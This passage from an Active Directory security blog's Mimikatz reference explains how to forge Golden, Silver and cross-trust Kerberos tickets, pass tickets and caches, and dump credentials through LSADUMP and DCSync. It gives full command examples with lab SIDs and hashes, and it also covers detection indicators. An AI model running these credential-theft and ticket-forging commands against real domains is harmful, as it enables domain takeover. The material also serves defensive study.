<li>/sids (optional) &#8211; set to be the SID of the Enterprise Admins group in the AD forest ([ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).</li>
<li>/aes128 &#8211; the AES128 key</li>
<li>/aes256 &#8211; the AES256 key</li>
</ul>
<p><span style="text-decoration: underline;">Golden Ticket Default Groups:</span></p>
<ul type="disc">
<li>Domain Users SID: S-1-5-21&lt;DOMAINID&gt;-513</li>
<li>Domain Admins SID: S-1-5-21&lt;DOMAINID&gt;-512</li>
<li>Schema Admins SID: S-1-5-21&lt;DOMAINID&gt;-518</li>
<li>Enterprise Admins SID: S-1-5-21&lt;DOMAINID&gt;-519  (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)</li>
<li>Group Policy Creator Owners SID: S-1-5-21&lt;DOMAINID&gt;-520</li>
</ul>
<p>kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt</p>
<p>Command Example:<br />
<em>.\mimikatz &#8220;kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt&#8221; exit</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2.png"><img class="alignnone size-full wp-image-1889" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2.png" alt="Mimikatz-CreateGoldenTicket-DarthVader2" width="963" height="510" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2-300x159.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2.png 963w" sizes="(max-width: 963px) 100vw, 963px" /></a></p>
<p>Golden Ticket References:</p>
<p>* <a href="https://adsecurity.org/?p=1640">Golden Tickets are now More Golden (with SID History)</a></p>
<p><strong>Update1/5/2016:</strong><br />
In early January 2015, I shared with customers indicators for detecting forged Kerberos tickets and subsequently presented this information at BSides Charm 2015. Soon after, Mimikatz was updated with a domain field that was set to static values, usually containing the string &#8220;eo.oe&#8221;. As of the <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz update dated 1/5/2016</a>, forged Kerberos tickets no longer include a domain anomaly since <a href="https://github.com/gentilkiwi/mimikatz/commit/fbb32cdcfa688892ab91b98044c453414193bb74#diff-60c3d6f46631121e0d6f97c2a2e143c9R602">the netbios domain name is placed in the domain component of the Kerberos ticket</a>.</p>
<p>Mimikatz code diff:<br />
<a href="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" rel="attachment wp-att-2486"><img class="alignnone size-full wp-image-2486" src="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" alt="GT-DomainFieldUpdate-20150105" width="1495" height="121" srcset="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105-300x24.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105-768x62.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105-1024x83.jpg 1024w, https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg 1495w" sizes="(max-width: 1495px) 100vw, 1495px" /></a></p>
<p>More information on the difficulty of detecting forged Kerberos tickets (Golden Tickets, Silver Tickets, etc) in the in the <a href="https://adsecurity.org/?p=1515#DetectingForgedKerberosTickets">Detecting Forged Kerberos Tickets section</a>.</p>
<p>&nbsp;</p>
<h4><span style="text-decoration: underline;"><a id="SilverTicket"></a><strong>Silver Ticket</strong></span></h4>
<p>A Silver Ticket is a TGS (similar to TGT in format) using the target service account’s (identified by SPN mapping) NTLM password hash to encrypt and sign.<br />
The Mimikatz command to create a silver ticket is “kerberos::golden”.</p>
<p><span style="text-decoration: underline;">Mimikatz Silver Ticket Command Reference:</span></p>
<ul type="disc">
<li><strong>/</strong>domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.</li>
<li><strong>/</strong>sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.</li>
<li>/sids &#8211; Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain  “S-1-5-21-1473643419-774954089-5872329127-519”. T<a href="https://adsecurity.org/?p=1640">his parameter adds the provided SIDs to the SID History parameter.</a></li>
<li><strong>/</strong>user – username to impersonate</li>
<li>/groups (optional) – group RIDs the user is a member of (the first is the primary group)<br />
default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).</li>
<li><strong>/</strong>ticket (optional) – provide a path and name for saving the forged ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.</li>
<li>/ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.</li>
<li><strong>/</strong>id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).</li>
<li>/startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.</li>
<li>/endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).</li>
<li><strong>/</strong>renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).</li>
<li>/aes128 &#8211; the AES128 key</li>
<li>/aes256 &#8211; the AES256 key</li>
</ul>
<p><span style="text-decoration: underline;">Silver Ticket Required Parameters:</span></p>
<ul type="disc">
<li><strong>/</strong>target – the target server’s FQDN.</li>
<li><strong>/</strong>service – the kerberos service running on the target server. This is the Service Principal Name class (or type) such as cifs, http, mssql.</li>
<li><strong>/</strong>rc4 – the NTLM hash for the service (computer account or user account)</li>
</ul>
<p><span style="text-decoration: underline;">Silver Ticket Default Groups:</span></p>
<ul type="disc">
<li>Domain Users SID: S-1-5-21&lt;DOMAINID&gt;-513</li>
<li>Domain Admins SID: S-1-5-21&lt;DOMAINID&gt;-512</li>
<li>Schema Admins SID: S-1-5-21&lt;DOMAINID&gt;-518</li>
<li>Enterprise Admins SID: S-1-5-21&lt;DOMAINID&gt;-519  (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)</li>
<li>Group Policy Creator Owners SID: S-1-5-21&lt;DOMAINID&gt;-520</li>
</ul>
<p>&nbsp;</p>
<p><span style="text-decoration: underline;">Example Mimikatz Command to Create a Silver Ticket:</span></p>
<p>The following Mimikatz command creates a Silver Ticket for the CIFS service on the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be successfully created, the AD computer account password hash for adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD domain dump or by running Mimikatz on the local system as shown above (<em>Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit</em>). The NTLM password hash is used with the /rc4 paramteer. The service SPN type also needs to be identified in the /service parameter. Finally, the target computer’s fully-qualified domain name needs to be provided in the /target parameter. Don’t forget the domain SID in the /sid parameter.</p>
<p><em>mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2.png"><img class="alignnone size-full wp-image-1890" src="https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2.png" alt="SilverTicketUsage-MemberServer-CIFS-AdminShare2" width="961" height="343" srcset="https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2-300x107.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2.png 961w" sizes="(max-width: 961px) 100vw, 961px" /></a></p>
<p><strong>Update1/5/2016:</strong><br />
In early January 2015, I shared with customers indicators for detecting forged Kerberos tickets and subsequently presented this information at BSides Charm 2015. Soon after, Mimikatz was updated with a domain field that was set to static values, usually containing the string &#8220;eo.oe&#8221;. As of the <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz update dated 1/5/2016</a>, forged Kerberos tickets no longer include a domain anomaly since <a href="https://github.com/gentilkiwi/mimikatz/commit/fbb32cdcfa688892ab91b98044c453414193bb74#diff-60c3d6f46631121e0d6f97c2a2e143c9R602">the netbios domain name is placed in the domain component of the Kerberos ticket</a>.</p>
<p>Mimikatz code diff:<br />
<a href="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" rel="attachment wp-att-2486"><img class="alignnone size-full wp-image-2486" src="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" alt="GT-DomainFieldUpdate-20150105" width="1495" height="121" srcset="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105-300x24.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105-768x62.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105-1024x83.jpg 1024w, https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg 1495w" sizes="(max-width: 1495px) 100vw, 1495px" /></a></p>
<p>More information on the difficulty of detecting forged Kerberos tickets (Golden Tickets, Silver Tickets, etc) in the in the <a href="https://adsecurity.org/?p=1515#DetectingForgedKerberosTickets">Detecting Forged Kerberos Tickets section</a>.</p>
<p>&nbsp;</p>
<h5><span style="text-decoration: underline;"><a id="TrustTicket"></a>Trust Ticket</span></h5>
<p>Once the Active Directory Trust password hash is determined (<a href="#LSADUMP">Mimikatz &#8220;privilege::debug&#8221; &#8220;lsadump::trust /patch&#8221; exit</a>), a trust ticket can be generated.<strong><br />
</strong><a href="https://adsecurity.org/?p=1588">More background on Trust Tickets.</a><strong><br />
</strong></p>
<p><span style="text-decoration: underline;">Forging Internal AD Forest Trust Tickets</span></p>
<p>In this example, Trust tickets leverage two additional tools Benjamin Delpy wrote called AskTGS and Kirbikator.</p>
<p><b>Step 1: Dumping trust passwords (trust keys)</b></p>
<p>Current Mimikatz versions can extract the trust keys (passwords).<br />
*  <a href="#LSADUMP">Mimikatz &#8220;privilege::debug&#8221; &#8220;lsadump::trust /patch&#8221; exit</a><strong><br />
</strong></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys.jpg"><img class="alignnone wp-image-1697" src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys.jpg" alt="TrustTicket-v2-Mimikatz-DumpTrustKeys" width="761" height="577" srcset="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys-300x227.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys.jpg 677w" sizes="(max-width: 761px) 100vw, 761px" /></a></p>
<p><b>Step 2: Create a forged trust ticket (inter-realm TGT) using Mimikatz</b></p>
<p>Forge the trust ticket which states the ticket holder is an Enterprise Admin in the AD Forest (leveraging SIDHistory, “sids”, across trusts in Mimikatz, my “contribution” to Mimikatz). This enables full administrative access from a child domain to the parent domain. Note that this account doesn’t have to exist anywhere as it is effectively a Golden Ticket across the trust.</p>
<p>The Mimikatz command to create a trust ticket is “kerberos::golden”</p>
<ul type="disc">
<li><strong>/</strong>domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.</li>
<li><strong>/</strong>sid – the SID of the domain. In this example: “S-1-5-21-3677078698-724690114-1972670770”.</li>
<li>/sids &#8211; Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain  “S-1-5-21-1581655573-3923512380-696647894-519”. T<a href="https://adsecurity.org/?p=1640">his parameter adds the provided SIDs to the SID History parameter.</a></li>
<li><strong>/</strong>user – username to impersonate</li>
<li>/groups (optional) – group RIDs the user is a member of (the first is the primary group)<br />
default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).</li>
<li><strong>/</strong>ticket (optional) – provide a path and name for saving the forged ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.</li>
<li>/ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.</li>
<li><strong>/</strong>id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).</li>
<li>/startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.</li>
<li>/endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).</li>
<li><strong>/</strong>renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).</li>
<li>/aes128 &#8211; the AES128 key</li>
<li>/aes256 &#8211; the AES256 key</li>
</ul>
<p><span style="text-decoration: underline;">Trust Ticket Specific Required Parameters:</span></p>
<ul type="disc">
<li><strong>/</strong>target – the target domain&#8217;s FQDN.</li>
<li><strong>/</strong>service – the kerberos service running in the target domain (krbtgt).</li>
<li><strong>/</strong>rc4 – the NTLM hash for the service kerberos service account (krbtgt).</li>
<li><strong>/</strong>ticket – provide a path and name for saving the forged ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.</li>
</ul>
<p><span style="text-decoration: underline;">Trust Ticket Default Groups:</span></p>
<ul type="disc">
<li>Domain Users SID: S-1-5-21&lt;DOMAINID&gt;-513</li>
<li>Domain Admins SID: S-1-5-21&lt;DOMAINID&gt;-512</li>
<li>Schema Admins SID: S-1-5-21&lt;DOMAINID&gt;-518</li>
<li>Enterprise Admins SID: S-1-5-21&lt;DOMAINID&gt;-519  (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)</li>
<li>Group Policy Creator Owners SID: S-1-5-21&lt;DOMAINID&gt;-520</li>
</ul>
<p><em>Mimikatz &#8220;Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 <strong>/sids:S-1-5-21-1581655573-3923512380-696647894-519</strong> /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi&#8221; exit</em></p>
<p>Note: Using the /sids parameter will create a trust ticket for the target AD domain that says the holder is an Enterprise Admin.</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory.jpg"><img class="alignnone wp-image-1694" src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory.jpg" alt="TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory" width="898" height="418" srcset="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory-300x140.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory.jpg 773w" sizes="(max-width: 898px) 100vw, 898px" /></a></p>
<p>NOTE: <a href="https://adsecurity.org/?p=1515">Mimikatz generates Silver Tickets with a hard-coded domain value which may appear in some events. It&#8217;s also likely the domain field in logon/logoff events relating to a forged ticket will have anomalies when compared to valid Kerberos authentication.</a></p>
<p><b>Step 3: Use the Trust Ticket file created in Step 2 to get a TGS for the targeted service in the destination domain. Save the TGS to a file.</b></p>
<p>The resulting TGS provides EA access to the parent (root) domain’s Domain Controller by targeting the CIFS service in this example (but it could target any).</p>
<p><em>Asktgs c:\temp\tickets\EA-ADSECLABCHILD.kirbi CIFS/ADSDC02.lab.adsecurity.org</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory.jpg"><img class="alignnone wp-image-1695" src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory.jpg" alt="TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory" width="784" height="183" srcset="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory-300x70.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory.jpg 638w" sizes="(max-width: 784px) 100vw, 784px" /></a></p>
<p><b>Step 4: Inject the TGS file created in Step 3 and then access the targeted service with the spoofed rights.</b></p>
<p><em>Kirbikator lsa c:\temp\tickets\CIFS.ADSDC02.lab.adsecurity.org.kirbi</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess.jpg"><img class="alignnone wp-image-1696" src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess.jpg" alt="TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess" width="845" height="187" srcset="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess-300x66.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess.jpg 700w" sizes="(max-width: 845px) 100vw, 845px" /></a></p>
<p>&nbsp;</p>
<p><b><b>KERBEROS::Hash </b></b>&#8211; hash password to keys</p>
<p><a id="KERBEROSList"></a><b><b>KERBEROS::List</b> &#8211;</b> List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user&#8217;s tickets.<b><br />
</b>Similar to functionality of &#8220;klist&#8221;.</p>
<ul>
<li>/export &#8211; export user tickets to files.</li>
</ul>
<p>Use <a href="#SEKURLSATickets">SEKURLSA::TICKETS</a> to dump Kerberos tickets for all authenticated users on the system.<br />
Note that there are circumstances where the user certificates won&#8217;t export. This requires running SEKURLSA::Tickets /export (with appropriate privileges).<br />
<a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png"><img class="alignnone size-full wp-image-1853" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" alt="Mimikatz-Kerberos-Purge" width="650" height="127" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge-300x59.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png 650w" sizes="(max-width: 650px) 100vw, 650px" /></a></p>
<p><b>KERBEROS::PTC</b> &#8211; pass the cache (NT6)<br />
*Nix systems like Mac OS, Linux,BSD, Unix, etc cache Kerberos credentials. This cached data can be copied off and passed using Mimikatz. Also useful for injecting Kerberos tickets in ccache files.</p>
<p>A good example of Mimikatz&#8217;s kerberos::ptc is when <a href="https://adsecurity.org/?p=676">exploiting MS14-068 with PyKEK</a>. PyKEK generates a ccache file which can be injected with Mimikatz using kerberos::ptc.</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg" rel="attachment wp-att-2348"><img class="alignnone size-full wp-image-2348" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg" alt="Mimikatz-PTC-PyKEK-ccacheFile" width="1204" height="586" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile-300x146.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile-768x374.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile-1024x498.jpg 1024w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg 1204w" sizes="(max-width: 1204px) 100vw, 1204px" /></a></p>
<p>&nbsp;</p>
<p><a id="KERBEROSPTT"></a><b>KERBEROS::PTT</b> &#8211; pass the ticket<br />
After a <a href="https://adsecurity.org/?p=1667">Kerberos ticket is found</a>, it can be copied to another system and passed into the current session effectively simulating a logon without any communication with the Domain Controller. No special rights required.<br />
Similar to SEKURLSA::PTH (Pass-The-Hash).</p>
<ul>
<li>/filename &#8211; the ticket&#8217;s filename (can be multiple)</li>
<li>/diretory &#8211; a directory path, all .kirbi files inside will be injected.</li>
</ul>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png"><img class="size-full wp-image-1887 alignnone" src="https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png" alt="KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2" width="862" height="242" srcset="https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2-300x84.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png 862w" sizes="(max-width: 862px) 100vw, 862px" /></a></p>
<p><b>KERBEROS::Purge</b> &#8211; purge all Kerberos tickets<br />
Similar to functionality of &#8220;klist purge&#8221;. Run this command before passing tickets (PTC, PTT, etc) to ensure the correct user context is used.</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png"><img class="size-full wp-image-1853 alignnone" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" alt="Mimikatz-Kerberos-Purge" width="650" height="127" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge-300x59.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png 650w" sizes="(max-width: 650px) 100vw, 650px" /></a></p>
<p><b>KERBEROS::TGT</b> &#8211; get current TGT for current user.</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png"><img class="size-full wp-image-1854 alignnone" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png" alt="Mimikatz-Kerberos-TGT" width="705" height="150" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT-300x64.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png 705w" sizes="(max-width: 705px) 100vw, 705px" /></a></p>
<p>&nbsp;</p>
<h4><b><a id="LSADUMP"></a>LSADUMP</b></h4>
<p>The LSADUMP Mimikatz Module interacts with the Windows Local Security Authority (LSA) to extract credentials. Most of these commands require either debug rights (privlege::debug) or local System. By default, the Administrators group has Debug rights. Debug still has to be &#8220;activated&#8221; by running &#8220;privilege::debug&#8221;.</p>
<p>&nbsp;</p>
<p><b>LSADUMP:Backupkeys<br />
</b>Requires Administrator rights.<b><br />
</b></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys.png"><img class="alignnone size-full wp-image-1855" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys.png" alt="Mimikatz-LSADump-BackupKeys" width="471" height="219" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys-300x139.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys.png 471w" sizes="(max-width: 471px) 100vw, 471px" /></a></p>
<p><b>LSADUMP::Cache</b> &#8211; Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)<br />
Requires Administrator rights.<b><br />
</b></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache.png"><img class="alignnone size-full wp-image-1856" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache.png" alt="Mimikatz-LSADump-Cache" width="778" height="151" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache-300x58.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache.png 778w" sizes="(max-width: 778px) 100vw, 778px" /></a></p>
<p><a id="LSADUMPDCSync"></a><a href="https://adsecurity.org/?p=1729"><b>LSADUMP::DCSync</b></a> &#8211; ask a DC to synchronize an object (get password data for account)<br />
<a href="https://adsecurity.org/?p=1729">Requires membership in Domain Administrator, domain Administrators, or custom delegation.<b></b></a></p>
<p>A major feature added to Mimkatz in August 2015 is “DCSync” which effectively “impersonates” a Domain Controller and requests account password data from the targeted Domain Controller. DCSync was written by Benjamin Delpy and Vincent Le Toux.</p>
<p>The exploit method prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the KRBTGT password hash to create Golden Tickets. With Mimikatz’s DCSync and the appropriate rights, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit).</p>
<p>Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not only allowed to pull password data for users by default.</p>
<p><b>How DCSync works:</b></p>
<ol>
<li>Discovers Domain Controller in the specified domain name.</li>
<li>Requests the Domain Controller replicate the user credentials via <a href="https://msdn.microsoft.com/en-us/library/dd207691.aspx">GetNCChanges </a>(leveraging <a href="https://msdn.microsoft.com/en-us/library/cc228086.aspx">Directory Replication Service (DRS) Remote Protocol</a>)</li>
</ol>
<p>I have previously done some packet captures for <a href="http://blogs.metcorpconsulting.com/tech/?p=923">Domain Controller replication</a> and identified the intra-DC communication flow regarding how Domain Controllers replicate.</p>
<p>The Samba Wiki describes the <a href="https://wiki.samba.org/index.php/DRSUAPI">DSGetNCChanges function</a>:</p>
<p><i>“The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica. &#8230;<br />
When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC’s which it replicates from.”</i></p>
<p><a id="DCSync"></a><strong><span style="text-decoration: underline;">DCSync Options:</span></strong></p>
<ul>
<li>/user &#8211; user id or SID of the user you want to pull the data for.</li>
<li>/domain (optional) &#8211; FQDN of the Active Directory domain. Mimikatz will discover a DC in the domain to connect to. If this parameter is not provided, Mimikatz defaults to the current domain.</li>
<li>/dc (optional) &#8211; Specify the Domain Controller you want DCSync to connect to and gather data.</li>
</ul>
<p>There&#8217;s also a /guid parameter.</p>
<p><strong><span style="text-decoration: underline;">DCSync Command Examples:</span></strong></p>
<p>Pull password data for the KRBTGT user account in the rd.adsecurity.org domain:<br />
<em>Mimikatz &#8220;privilege::debug&#8221; &#8220;lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt&#8221; exit</em></p>
<p>Pull password data for the Administrator user account in the rd.adsecurity.org domain:<br />
<em>Mimikatz &#8220;privilege::debug&#8221; &#8220;lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator&#8221; exit</em></p>
<p>Pull password data for the ADSDC03 Domain Controller computer account in the lab.adsecurity.org domain:<br />
<em>Mimikatz &#8220;privilege::debug&#8221; &#8220;lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$&#8221; exit</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync.jpg"><img class="alignnone size-full wp-image-1822" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync.jpg" alt="Mimikatz-LSADump-DCSync" width="691" height="491" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync-300x213.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync.jpg 691w" sizes="(max-width: 691px) 100vw, 691px" /></a></p>
<p><b>LSADUMP::LSA</b> &#8211; Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use /patch for a subset of data, use /inject for everything. <em>Requires System or Debug rights.</em></p>
<ul>
<li>/inject &#8211; Inject LSASS to extract credentials</li>
<li>/name &#8211; account name for target user account</li>
<li>/id &#8211; RID for target user account</li>
<li>/patch &#8211; patch LSASS.</li>
</ul>
<p>Often service accounts are members of Domain Admins (or equivalent) or a Domain Admin was recently logged on to the computer an attacker dump credentials from. Using these credentials, an attacker can gain access to a Domain Controller and get all domain credentials, including the KRBTGT account NTLM hash which is used to create Kerberos Golden Tickets.</p>
